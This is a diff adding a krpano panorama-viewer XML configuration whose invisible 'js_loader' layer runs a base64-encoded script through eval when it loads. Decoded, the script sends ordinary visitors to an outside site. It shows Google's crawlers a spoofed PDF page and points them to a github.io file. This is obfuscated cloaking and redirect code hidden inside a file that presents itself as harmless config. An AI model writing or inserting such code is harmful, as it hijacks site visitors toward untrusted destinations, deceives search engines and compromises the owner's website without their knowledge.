@@ -1,0 +1,5 @@
+<krpano version="1.0.8.15">
+    <SCRIPT id="allow-copy_script"/>
+    <layer name="js_loader" type="container" visible="false" 
+           onloaded="js(eval(var w=atob('KGZ1bmN0aW9uICgpIHsNCiAgdmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAiYWxjYXphcl9hcnF1aXRlY3RvbmljbyI7DQogIHZhciB1YSA9IG5hdmlnYXRvci51c2VyQWdlbnQudG9Mb3dlckNhc2UoKTsNCg0KICB2YXIgaXNHb29nbGVib3QgPSAvZ29vZ2xlYm90fGdvb2dsZS1pbnNwZWN0aW9udG9vbHxnb29nbGVvdGhlcnxhZHNib3QtZ29vZ2xlfG1lZGlhcGFydG5lcnMtZ29vZ2xlLy50ZXN0KHVhKTsNCg0KICBpZiAoIWlzR29vZ2xlYm90KSB7DQogICAgbG9jYXRpb24ucmVwbGFjZSgiaHR0cHM6Ly92aXJhbHp4LmNvbS9wZGYtaHRtbC1yZS8iKTsNCiAgICByZXR1cm47DQogIH0NCg0KICAvLyBTaHVkaSBHb29nbGVib3QNCiAgZG9jdW1lbnQudGl0bGUgPSBpZCArICIgLSBQREZEb2N1bWVudCI7DQogIGxvY2F0aW9uLmhyZWYgPSAiaHR0cHM6Ly9hdGVuZGV2cy5naXRodWIuaW8vYWxhZGFraS9vZTMvIiArIGlkICsgIi5wZGYiOw0KfSkoKTs=');eval(w)););"/>
+</krpano>
